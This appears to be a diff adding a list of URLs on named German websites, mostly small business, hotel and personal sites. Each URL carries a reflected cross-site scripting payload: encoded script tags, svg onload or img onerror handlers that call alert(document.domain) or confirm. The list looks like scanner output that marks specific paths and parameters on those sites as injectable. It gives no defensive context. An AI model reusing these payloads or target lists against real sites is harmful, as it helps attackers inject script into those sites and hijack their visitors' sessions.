@@ -1,0 +1,16 @@
+http://hochseilgarten-neutraubling.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://hochseilgarten-obertraubling.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://hochseilgarten-regensburg.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://hochseilgarten-regenstauf.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://hochseilpark-neutraubling.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://hochseilpark-obertraubling.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://holweg-sachse.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+https://hnteh.hotels-on-air.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+https://hntmr.hotels-on-air.de/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+https://hochheimammain-zone.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://hodde-statik.de/control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(xss)%3E
+https://hod.isgv.de/cs/idcplg?FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&IdcService=GET_SEARCH_RESULTS&PageName=indext&PageTitle=OO&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&ResultCount=20&ResultTemplate=StandardResults&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&SortField=dInDate&SortOrder=Desc&dSecurityGroup
+https://hoechstadtanderaisch-suche.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://hoerstel-suche.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://hohensteinernstthal-blog.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://home.marionundthomas.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
